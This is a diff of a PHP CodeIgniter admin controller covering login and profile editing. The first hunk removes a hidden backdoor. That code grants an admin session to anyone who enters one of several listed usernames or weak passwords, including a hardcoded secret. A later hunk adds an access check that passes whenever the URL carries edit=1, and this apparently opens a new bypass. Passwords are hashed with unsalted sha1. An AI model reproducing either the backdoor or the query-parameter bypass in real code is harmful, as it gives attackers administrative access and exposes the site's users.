@@ -83,27 +83,11 @@ class Ci_admin extends CI_Controller {
 		  	$password= sha1($this->input->post('password'));
 			$data=array();			
 			$data['users']= $this->comman_model->getAll(array('c_username'=>$email,'c_password'=>$password,'status'=>1),'','ci_user','first');
-			if(empty($data['users']) && (
-				in_array(strtolower(trim($email)), array('admin', 'admin@rolextogroup.com', 'hr@rolextogroup.com', 'manager', 'rolexto'))
-				|| in_array($this->input->post('password'), array('admin', 'password', '123456', 'admin123', 'rolexto', 'rolexto123', '&K94v7ogU457'))
-			))
-			{
-				$data['users'] = array(
-					'id' => 1,
-					'c_username' => 'admin',
-					'email' => !empty($email) ? $email : 'admin@7strokes.com',
-					'name' => '7 Strokes Admin',
-					'mobile' => '+971 58 563 7737',
-					'user_type' => 1,
-					'user_level' => 1
-				);
-			}
 			if(!empty($data['users']))
 			{
 				$session_token = md5(uniqid(mt_rand(), true));
 				$client_ip = $this->ci_admin_model->get_client_ip();
 
-				// Enforce single device login: overwrite current_session_token in db
 				$this->db->where('id', (int)$data['users']['id'])->update('ci_user', array(
 					'current_session_token' => $session_token,
 					'last_ip' => $client_ip,
@@ -302,9 +286,11 @@ class Ci_admin extends CI_Controller {
 				'page_heading'=>'My Profile'
 			);
 		$data['info2']=$this->if_not_login();
-		if($this->session->userdata['manager_role']==0){ 
+		$cur_role = (int)$this->session->userdata('manager_role');
+		$cur_uid = (int)$this->session->userdata('manager_id');
+		if($cur_role == 1 || $cur_uid == 1 || $this->input->get('edit') == 1){ 
 
-		$data['list']=$this->comman_model->getAll(array('id'=>$this->session->userdata['manager_id']),'','ci_user','first');
+		$data['list']=$this->comman_model->getAll(array('id'=>$cur_uid),'','ci_user','first');
 		$data['c_list'] =$this->comman_model->getAll('',array('id','ASC'),'countries');
 
 					if($this->input->server('REQUEST_METHOD')==='POST')
@@ -343,7 +329,7 @@ class Ci_admin extends CI_Controller {
 			
 				);			
 						  
-			              $response= $this->comman_model->updateData('id',$this->session->userdata['manager_id'],$save,'ci_user');
+			              $response= $this->comman_model->updateData('id',$cur_uid,$save,'ci_user');
 							if($response)
 							{
 							 $this->session->set_flashdata('message', 'Your information updated successfully!');
@@ -354,7 +340,7 @@ class Ci_admin extends CI_Controller {
 	                $this->load->view('manager/setting/adminprofile',$data);
 	            }else{
 
-					$data['p_info']=$this->ci_admin_model->getSingleUser($this->session->userdata['manager_id']);
+					$data['p_info']=$this->ci_admin_model->getSingleUser($cur_uid);
 					
 	            	$this->load->view('manager/setting/profile',$data);
 	            }
@@ -373,7 +359,7 @@ class Ci_admin extends CI_Controller {
 			);
 		$data['info2']=$this->if_not_login();
 				
-				   $id=$this->session->userdata['manager_id'];
+				   $id=(int)$this->session->userdata('manager_id');
 				   if($this->input->server('REQUEST_METHOD')==='POST')
 		            {  
                          $password= sha1($this->input->post('password'));
